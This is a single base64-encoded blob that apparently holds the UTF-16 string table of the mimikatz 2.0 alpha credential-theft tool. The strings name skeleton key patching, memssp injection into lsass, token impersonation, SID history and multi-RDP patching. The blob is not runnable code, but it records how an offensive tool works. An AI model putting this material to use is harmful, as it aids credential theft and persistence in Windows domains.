dQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAE8AUwAgAG4AbwB0ACAAcwB1AHAAcABvAHIAdABlAGQAIAAoAG8AbgBsAHkAIAB3ADIAawA4AHIAMgAgACYAIAB3ADIAawAxADIAcgAyACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAEkAdAAgAHIAZQBxAHUAaQByAGUAcwAgAGEAdAAgAGwAZQBhAHMAdAAgADIAIABhAHIAZwBzAAoAAABtAHMAdgBjAHIAdAAuAGQAbABsAAAAAABmb3BlbgAAAGZ3cHJpbnRmAAAAAGZjbG9zZQAAAAAAAGwAcwBhAHMAcwAuAGUAeABlAAAAAAAAAG0AcwB2ADEAXwAwAC4AZABsAGwAAAAAAEkAbgBqAGUAYwB0AGUAZAAgAD0AKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgAC0AIABUAHIAYQBtAHAAbwBsAGkAbgBlACAAbgAwACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgAC0AIABUAHIAYQBtAHAAbwBsAGkAbgBlACAAbgAxACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgAC0AIAByAGUAYQBsACAAYQBzAG0AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AcwBlAGEAcgBjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABQAHIAbwBjAGUAcwBzAEkAZABGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAABMb2NhbEFsbG9jAAAAAAAAawBkAGMAcwB2AGMALgBkAGwAbAAAAAAAWwBLAEQAQwBdACAAZABhAHQAYQAKAAAAWwBLAEQAQwBdACAAcwB0AHIAdQBjAHQACgAAAAAAAABbAEsARABDAF0AIABrAGUAeQBzACAAcABhAHQAYwBoACAATwBLAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBzAGsAZQBsAGUAdABvAG4AIAA7ACAAUwBlAGMAbwBuAGQAIABwAGEAdAB0AGUAcgBuACAAbgBvAHQAIABmAG8AdQBuAGQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AcwBrAGUAbABlAHQAbwBuACAAOwAgAEYAaQByAHMAdAAgAHAAYQB0AHQAZQByAG4AIABuAG8AdAAgAGYAbwB1AG4AZAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAHMAawBlAGwAZQB0AG8AbgAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABWAGUAcgB5AEIAYQBzAGkAYwBNAG8AZAB1AGwAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwBGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAABjAHIAeQBwAHQAZABsAGwALgBkAGwAbAAAAAAAAAAAAFsAUgBDADQAXQAgAGYAdQBuAGMAdABpAG8AbgBzAAoAAAAAAAAAAABbAFIAQwA0AF0AIABpAG4AaQB0ACAAcABhAHQAYwBoACAATwBLAAoAAAAAAAAAAABbAFIAQwA0AF0AIABkAGUAYwByAHkAcAB0ACAAcABhAHQAYwBoACAATwBLAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBzAGsAZQBsAGUAdABvAG4AIAA7ACAAVQBuAGEAYgBsAGUAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHIAZQBtAG8AdABlACAAZgB1AG4AYwB0AGkAbwBuAHMACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAHMAawBlAGwAZQB0AG8AbgAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAbABvAGMAYQBsAGcAcgBvAHUAcAAAAAAAZwByAG8AdQBwAAAAAAAAAG4AZQB0AAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBPAHAAZQBuAEQAbwBtAGEAaQBuACAAQgB1AGkAbAB0AGkAbgAgACgAPwApACAAJQAwADgAeAAKAAAACgBEAG8AbQBhAGkAbgAgAG4AYQBtAGUAIAA6ACAAJQB3AFoAAAAAAAoARABvAG0AYQBpAG4AIABTAEkARAAgACAAOgAgAAAACgAgACUALQA1AHUAIAAlAHcAWgAAAAAACgAgAHwAIAAlAC0ANQB1ACAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABJAGQAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0ARwBlAHQARwByAG8AdQBwAHMARgBvAHIAVQBzAGUAcgAgACUAMAA4AHgAAAAAAAAAAAAKACAAfABgACUALQA1AHUAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBHAGUAdABBAGwAaQBhAHMATQBlAG0AYgBlAHIAcwBoAGkAcAAgACUAMAA4AHgAAAAAAAoAIAB8ALQAJQAtADUAdQAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAFIAaQBkAFQAbwBTAGkAZAAgACUAMAA4AHgAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4AVQBzAGUAcgAgACUAMAA4AHgAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEUAbgB1AG0AZQByAGEAdABlAFUAcwBlAHIAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBPAHAAZQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABEAG8AbQBhAGkAbgBJAG4AUwBhAG0AUwBlAHIAdgBlAHIAIAAlADAAOAB4AAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0ARQBuAHUAbQBlAHIAYQB0AGUARABvAG0AYQBpAG4AcwBJAG4AUwBhAG0AUwBlAHIAdgBlAHIAIAAlADAAOAB4AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBDAG8AbgBuAGUAYwB0ACAAJQAwADgAeAAKAAAAAAAAAAAAZABlAGIAdQBnAAAAAAAAAEEAcwBrACAAZABlAGIAdQBnACAAcAByAGkAdgBpAGwAZQBnAGUAAABwAHIAaQB2AGkAbABlAGcAZQAAAAAAAABQAHIAaQB2AGkAbABlAGcAZQAgAG0AbwBkAHUAbABlAAAAAAAAAAAAUAByAGkAdgBpAGwAZQBnAGUAIAAnACUAdQAnACAATwBLAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBwAHIAaQB2AGkAbABlAGcAZQBfAHMAaQBtAHAAbABlACAAOwAgAFIAdABsAEEAZABqAHUAcwB0AFAAcgBpAHYAaQBsAGUAZwBlACAAKAAlAHUAKQAgACUAMAA4AHgACgAAAAAAAABlAHgAcABvAHIAdABzAAAATABpAHMAdAAgAGUAeABwAG8AcgB0AHMAAAAAAAAAAABpAG0AcABvAHIAdABzAAAATABpAHMAdAAgAGkAbQBwAG8AcgB0AHMAAAAAAAAAAABzAHQAYQByAHQAAAAAAAAAUwB0AGEAcgB0ACAAYQAgAHAAcgBvAGMAZQBzAHMAAABzAHQAbwBwAAAAAAAAAAAAVABlAHIAbQBpAG4AYQB0AGUAIABhACAAcAByAG8AYwBlAHMAcwAAAHMAdQBzAHAAZQBuAGQAAABTAHUAcwBwAGUAbgBkACAAYQAgAHAAcgBvAGMAZQBzAHMAAAAAAAAAcgBlAHMAdQBtAGUAAAAAAFIAZQBzAHUAbQBlACAAYQAgAHAAcgBvAGMAZQBzAHMAAAAAAAAAAABQAHIAbwBjAGUAcwBzACAAbQBvAGQAdQBsAGUAAAAAAFQAcgB5AGkAbgBnACAAdABvACAAcwB0AGEAcgB0ACAAIgAlAHMAIgAgADoAIAAAAE8ASwAgACEAIAAoAFAASQBEACAAJQB1ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBzAHQAYQByAHQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AYwByAGUAYQB0AGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAE4AdABUAGUAcgBtAGkAbgBhAHQAZQBQAHIAbwBjAGUAcwBzAAAAAABOAHQAUwB1AHMAcABlAG4AZABQAHIAbwBjAGUAcwBzAAAAAAAAAAAATgB0AFIAZQBzAHUAbQBlAFAAcgBvAGMAZQBzAHMAAAAlAHMAIABvAGYAIAAlAHUAIABQAEkARAAgADoAIABPAEsAIAAhAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAbgBlAHIAaQBjAE8AcABlAHIAYQB0AGkAbwBuACAAOwAgACUAcwAgADAAeAAlADAAOAB4AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAG4AZQByAGkAYwBPAHAAZQByAGEAdABpAG8AbgAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAbgBlAHIAaQBjAE8AcABlAHIAYQB0AGkAbwBuACAAOwAgAHAAaQBkACAAKAAvAHAAaQBkADoAMQAyADMAKQAgAGkAcwAgAG0AaQBzAHMAaQBuAGcAAAAAAAAAJQB1AAkAJQB3AFoACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AYwBhAGwAbABiAGEAYwBrAFAAcgBvAGMAZQBzAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBjAGEAbABsAGIAYQBjAGsAUAByAG8AYwBlAHMAcwAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AbwBwAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAACgAlAHcAWgAAAAAAAAAAAAoACQAlAHAAIAAtAD4AIAAlAHUAAAAAAAkAJQB1AAAACQAgAAAAAAAJACUAcAAAAAkAJQBTAAAACQAtAD4AIAAlAFMAAAAAAAoACQAlAHAAIAAtAD4AIAAlAHAACQAlAFMAIAAhACAAAAAAACUAUwAAAAAAAAAAACMAJQB1AAAAUwB0AGEAcgB0ACAAcwBlAHIAdgBpAGMAZQAAAAAAAABSAGUAbQBvAHYAZQAgAHMAZQByAHYAaQBjAGUAAAAAAFMAdABvAHAAIABzAGUAcgB2AGkAYwBlAAAAAAAAAAAAUwB1AHMAcABlAG4AZAAgAHMAZQByAHYAaQBjAGUAAABSAGUAcwB1AG0AZQAgAHMAZQByAHYAaQBjAGUAAAAAAHAAcgBlAHMAaAB1AHQAZABvAHcAbgAAAFAAcgBlAHMAaAB1AHQAZABvAHcAbgAgAHMAZQByAHYAaQBjAGUAAABzAGgAdQB0AGQAbwB3AG4AAAAAAAAAAABTAGgAdQB0AGQAbwB3AG4AIABzAGUAcgB2AGkAYwBlAAAAAAAAAAAATABpAHMAdAAgAHMAZQByAHYAaQBjAGUAcwAAAAAAAABTAGUAcgB2AGkAYwBlACAAbQBvAGQAdQBsAGUAAAAAACUAcwAgACcAJQBzACcAIABzAGUAcgB2AGkAYwBlACAAOgAgAAAAAABFAFIAUgBPAFIAIABnAGUAbgBlAHIAaQBjAEYAdQBuAGMAdABpAG8AbgAgADsAIABTAGUAcgB2AGkAYwBlACAAbwBwAGUAcgBhAHQAaQBvAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAZwBlAG4AZQByAGkAYwBGAHUAbgBjAHQAaQBvAG4AIAA7ACAASQBuAGoAZQBjAHQAIABuAG8AdAAgAGEAdgBhAGkAbABhAGIAbABlAAoAAAAAAAAARQBSAFIATwBSACAAZwBlAG4AZQByAGkAYwBGAHUAbgBjAHQAaQBvAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAHMAZQByAHYAaQBjAGUAIABuAGEAbQBlACAAYQByAGcAdQBtAGUAbgB0AAoAAAAAAFMAdABhAHIAdABpAG4AZwAAAAAAAAAAAFIAZQBtAG8AdgBpAG4AZwAAAAAAAAAAAFMAdABvAHAAcABpAG4AZwAAAAAAAAAAAFMAdQBzAHAAZQBuAGQAaQBuAGcAAAAAAFIAZQBzAHUAbQBpAG4AZwAAAAAAAAAAAFAAcgBlAHMAaAB1AHQAZABvAHcAbgAAAFMAaAB1AHQAZABvAHcAbgAAAAAAAAAAAHMAZQByAHYAaQBjAGUAcwAuAGUAeABlAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AcwBlAHIAdgBpAGMAZQBfAHMAZQBuAGQAYwBvAG4AdAByAG8AbABfAGkAbgBwAHIAbwBjAGUAcwBzACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBzAGUAYQByAGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAGUAcgByAG8AcgAgACUAdQAKAAAAAAAAAE8ASwAhAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AcwBlAHIAdgBpAGMAZQBfAHMAZQBuAGQAYwBvAG4AdAByAG8AbABfAGkAbgBwAHIAbwBjAGUAcwBzACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBjAHIAZQBhAHQAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAHMAZQByAHYAaQBjAGUAXwBzAGUAbgBkAGMAbwBuAHQAcgBvAGwAXwBpAG4AcAByAG8AYwBlAHMAcwAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBzAGUAcgB2AGkAYwBlAF8AcwBlAG4AZABjAG8AbgB0AHIAbwBsAF8AaQBuAHAAcgBvAGMAZQBzAHMAIAA7ACAATgBvAHQAIABhAHYAYQBpAGwAYQBiAGwAZQAgAHcAaQB0AGgAbwB1AHQAIABTAGMAUwBlAG4AZABDAG8AbgB0AHIAbwBsAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AcwBlAHIAdgBpAGMAZQBfAHMAZQBuAGQAYwBvAG4AdAByAG8AbABfAGkAbgBwAHIAbwBjAGUAcwBzACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAZQB4AGkAdAAAAAAAAAAAAFEAdQBpAHQAIABtAGkAbQBpAGsAYQB0AHoAAAAAAAAAYwBsAHMAAABDAGwAZQBhAHIAIABzAGMAcgBlAGUAbgAgACgAZABvAGUAcwBuACcAdAAgAHcAbwByAGsAIAB3AGkAdABoACAAcgBlAGQAaQByAGUAYwB0AGkAbwBuAHMALAAgAGwAaQBrAGUAIABQAHMARQB4AGUAYwApAAAAAABhAG4AcwB3AGUAcgAAAAAAAAAAAAAAAABBAG4AcwB3AGUAcgAgAHQAbwAgAHQAaABlACAAVQBsAHQAaQBtAGEAdABlACAAUQB1AGUAcwB0AGkAbwBuACAAbwBmACAATABpAGYAZQAsACAAdABoAGUAIABVAG4AaQB2AGUAcgBzAGUALAAgAGEAbgBkACAARQB2AGUAcgB5AHQAaABpAG4AZwAAAAAAAABjAG8AZgBmAGUAZQAAAAAAUABsAGUAYQBzAGUALAAgAG0AYQBrAGUAIABtAGUAIABhACAAYwBvAGYAZgBlAGUAIQAAAAAAAABzAGwAZQBlAHAAAAAAAAAAAAAAAAAAAABTAGwAZQBlAHAAIABhAG4AIABhAG0AbwB1AG4AdAAgAG8AZgAgAG0AaQBsAGwAaQBzAGUAYwBvAG4AZABzAAAATABvAGcAIABtAGkAbQBpAGsAYQB0AHoAIABpAG4AcAB1AHQALwBvAHUAdABwAHUAdAAgAHQAbwAgAGYAaQBsAGUAAAAAAAAAYgBhAHMAZQA2ADQAAAAAAAAAAAAAAAAAUwB3AGkAdABjAGgAIABmAGkAbABlACAAbwB1AHQAcAB1AHQALwBiAGEAcwBlADYANAAgAG8AdQB0AHAAdQB0AAAAAAAAAAAAdgBlAHIAcwBpAG8AbgAAAAAAAAAAAAAARABpAHMAcABsAGEAeQAgAHMAbwBtAGUAIAB2AGUAcgBzAGkAbwBuACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAHMAAABjAGQAAAAAAAAAAABDAGgAYQBuAGcAZQAgAG8AcgAgAGQAaQBzAHAAbABhAHkAIABjAHUAcgByAGUAbgB0ACAAZABpAHIAZQBjAHQAbwByAHkAAABtAGEAcgBrAHIAdQBzAHMAAAAAAAAAAABNAGEAcgBrACAAYQBiAG8AdQB0ACAAUAB0AEgAAAAAAHMAdABhAG4AZABhAHIAZAAAAAAAAAAAAFMAdABhAG4AZABhAHIAZAAgAG0AbwBkAHUAbABlAAAAAAAAAAAAAABCAGEAcwBpAGMAIABjAG8AbQBtAGEAbgBkAHMAIAAoAGQAbwBlAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAIABtAG8AZAB1AGwAZQAgAG4AYQBtAGUAKQAAAAAAAABCAHkAZQAhAAoAAAAAAAAANAAyAC4ACgAAAAAAAAAAAAoAIAAgACAAIAAoACAAKAAKACAAIAAgACAAIAApACAAKQAKACAAIAAuAF8AXwBfAF8AXwBfAC4ACgAgACAAfAAgACAAIAAgACAAIAB8AF0ACgAgACAAXAAgACAAIAAgACAAIAAvAAoAIAAgACAAYAAtAC0ALQAtACcACgAAAAAAUwBsAGUAZQBwACAAOgAgACUAdQAgAG0AcwAuAC4ALgAgAAAAAAAAAEUAbgBkACAAIQAKAAAAAABtAGkAbQBpAGsAYQB0AHoALgBsAG8AZwAAAAAAAAAAAFUAcwBpAG4AZwAgACcAJQBzACcAIABmAG8AcgAgAGwAbwBnAGYAaQBsAGUAIAA6ACAAJQBzAAoAAAAAAAAAAAB0AHIAdQBlAAAAAAAAAAAAZgBhAGwAcwBlAAAAAAAAAGkAcwBCAGEAcwBlADYANABJAG4AdABlAHIAYwBlAHAAdAAgAHcAYQBzACAAIAAgACAAOgAgACUAcwAKAAAAAABpAHMAQgBhAHMAZQA2ADQASQBuAHQAZQByAGMAZQBwAHQAIABpAHMAIABuAG8AdwAgADoAIAAlAHMACgAAAAAANgA0AAAAAAAKAG0AaQBtAGkAawBhAHQAegAgADIALgAwACAAYQBsAHAAaABhACAAKABhAHIAYwBoACAAeAA2ADQAKQAKAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAlAHUALgAlAHUAIABiAHUAaQBsAGQAIAAlAHUAIAAoAGEAcgBjAGgAIAB4ACUAcwApAAoAbQBzAHYAYwAgACUAdQAgACUAdQAKAAAAQwB1AHIAOgAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwB0AGEAbgBkAGEAcgBkAF8AYwBkACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGcAZQB0AEMAdQByAHIAZQBuAHQARABpAHIAZQBjAHQAbwByAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAE4AZQB3ADoAIAAlAHMACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAHQAYQBuAGQAYQByAGQAXwBjAGQAIAA7ACAAUwBlAHQAQwB1AHIAcgBlAG4AdABEAGkAcgBlAGMAdABvAHIAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAUwBvAHIAcgB5ACAAeQBvAHUAIABnAHUAeQBzACAAZABvAG4AJwB0ACAAZwBlAHQAIABpAHQALgAKAAAAAAAAAHcAaABvAGEAbQBpAAAAAABEAGkAcwBwAGwAYQB5ACAAYwB1AHIAcgBlAG4AdAAgAGkAZABlAG4AdABpAHQAeQAAAAAAAAAAAEwAaQBzAHQAIABhAGwAbAAgAHQAbwBrAGUAbgBzACAAbwBmACAAdABoAGUAIABzAHkAcwB0AGUAbQAAAAAAAABlAGwAZQB2AGEAdABlAAAASQBtAHAAZQByAHMAbwBuAGEAdABlACAAYQAgAHQAbwBrAGUAbgAAAHIAZQB2AGUAcgB0AAAAAABSAGUAdgBlAHIAdAAgAHQAbwAgAHAAcgBvAGMAZQBzACAAdABvAGsAZQBuAAAAAAB0AG8AawBlAG4AAAAAAAAAVABvAGsAZQBuACAAbQBhAG4AaQBwAHUAbABhAHQAaQBvAG4AIABtAG8AZAB1AGwAZQAAAAAAAAAgACoAIABQAHIAbwBjAGUAcwBzACAAVABvAGsAZQBuACAAOgAgAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAHcAaABvAGEAbQBpACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwBUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAIAAqACAAVABoAHIAZQBhAGQAIABUAG8AawBlAG4AIAAgADoAIAAAAG4AbwAgAHQAbwBrAGUAbgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AdwBoAG8AYQBtAGkAIAA7ACAATwBwAGUAbgBUAGgAcgBlAGEAZABUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABkAG8AbQBhAGkAbgBhAGQAbQBpAG4AAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwBsAG8AYwBhAGwAXwBkAG8AbQBhAGkAbgBfAHUAcwBlAHIAXwBnAGUAdABDAHUAcgByAGUAbgB0AEQAbwBtAGEAaQBuAFMASQBEACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAATgBvACAAdQBzAGUAcgBuAGEAbQBlACAAYQB2AGEAaQBsAGEAYgBsAGUAIAB3AGgAZQBuACAAUwBZAFMAVABFAE0ACgAAAFQAbwBrAGUAbgAgAEkAZAAgACAAOgAgACUAdQAKAFUAcwBlAHIAIABuAGEAbQBlACAAOgAgACUAcwAKAFMASQBEACAAbgBhAG0AZQAgACAAOgAgAAAAAAAlAHMAXAAlAHMACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlACAAOwAgAGsAdQBsAGwAXwBtAF8AdABvAGsAZQBuAF8AZwBlAHQATgBhAG0AZQBEAG8AbQBhAGkAbgBGAHIAbwBtAFMASQBEACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwBsAG8AYwBhAGwAXwBkAG8AbQBhAGkAbgBfAHUAcwBlAHIAXwBDAHIAZQBhAHQAZQBXAGUAbABsAEsAbgBvAHcAbgBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AcgBlAHYAZQByAHQAIAA7ACAAUwBlAHQAVABoAHIAZQBhAGQAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABBAG4AbwBuAHkAbQBvAHUAcwAAAAAAAABJAGQAZQBuAHQAaQBmAGkAYwBhAHQAaQBvAG4AAAAAAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AAAAAAAAARABlAGwAZQBnAGEAdABpAG8AbgAAAAAAVQBuAGsAbgBvAHcAbgAAACUALQAxADAAdQAJAAAAAAAlAHMAXAAlAHMACQAlAHMAAAAAAAAAAAAJACgAJQAwADIAdQBnACwAJQAwADIAdQBwACkACQAlAHMAAAAAAAAAIAAoACUAcwApAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAXwBjAGEAbABsAGIAYQBjAGsAIAA7ACAAQwBoAGUAYwBrAFQAbwBrAGUAbgBNAGUAbQBiAGUAcgBzAGgAaQBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAlAHUACQAAACAALQA+ACAASQBtAHAAZQByAHMAbwBuAGEAdABlAGQAIAAhAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlAF8AYwBhAGwAbABiAGEAYwBrACAAOwAgAFMAZQB0AFQAaAByAGUAYQBkAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABtAHUAbAB0AGkAcgBkAHAAAAAAAAAAAAAAAAAAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAHAAYQB0AGMAaAAgAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAcwBlAHIAdgBpAGMAZQAgAHQAbwAgAGEAbABsAG8AdwAgAG0AdQBsAHQAaQBwAGwAZQBzACAAdQBzAGUAcgBzAAAAdABzAAAAAAAAAAAAVABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABtAG8AZAB1AGwAZQAAAAAAdABlAHIAbQBzAHIAdgA